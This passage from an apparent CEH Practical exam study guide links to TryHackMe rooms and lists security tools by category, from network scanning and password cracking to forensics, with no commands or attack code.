     - **Wireshark**: [Wireshark TryHackMe](https://tryhackme.com/room/wireshark)
     - **John the Ripper**: [John the Ripper TryHackMe](https://tryhackme.com/room/johntheripper0)
     - **Metasploit**: [Metasploit TryHackMe](https://tryhackme.com/room/rpmetasploit)


---


## 🛠️ **Tools You Must Have Hands-On**

To excel in the CEH Practical Exam, it's crucial to have hands-on experience with the following tools:

### **Network Scanning & Enumeration**

- **Nmap**
- **Netdiscover**
- **Masscan**

### **Password Cracking**

- **John the Ripper**
- **Hashcat**
- **Hydra**
- **Medusa**

### **Vulnerability Scanning**

- **Nessus**
- **OpenVAS**
- **Acunetix**
- **Nikto**
- **OWASP ZAP**

### **Exploitation Frameworks**

- **Metasploit Framework**
- **BeEF (Browser Exploitation Framework)**

### **Web Application Testing**

- **Burp Suite**
- **SqlMap**
- **WPScan**
- **Dirb**
- **Gobuster**
- **ffuf**

### **Steganography & Cryptography**

- **Steghide**
- **OpenStego**
- **QuickStego**
- **Snow**
- **VeraCrypt**
- **Cryptool**
- **Hash Calculator**

### **Reverse Engineering & Malware Analysis**

- **Ghidra**
- **Jadx**
- **DnSpy**
- **DIE (Detect It Easy)**
- **OllyDbg**

### **Packet Analysis**

- **Wireshark**
- **Tcpdump**

### **Wireless Attacks**

- **Aircrack-ng**
- **Reaver**

### **Android Hacking**

- **ADB (Android Debug Bridge)**
- **PhoneSploit**
- **Knox Player Emulator**
- **Frida**
- **Objection**

### **Forensics**

- **Autopsy**
- **FTK Imager**
- **Cellebrite**

### **Miscellaneous**

- **BrowserLink**
- **IBM QRadar**
- **Wazuh**
- **Hashcalc**
- **MD5Calculator**

---

**Note**: Practice using these tools in various scenarios to be prepared for any practical task during the exam.

---

> **Enjoy your journey of mastering ethical hacking!** 😎

---

> **Enjoy your journey of mastering hacking!** 😎

> **Follow on Linkedin for more:https://www.linkedin.com/in/m-zeeshan-zafar-9205a1248/**
---
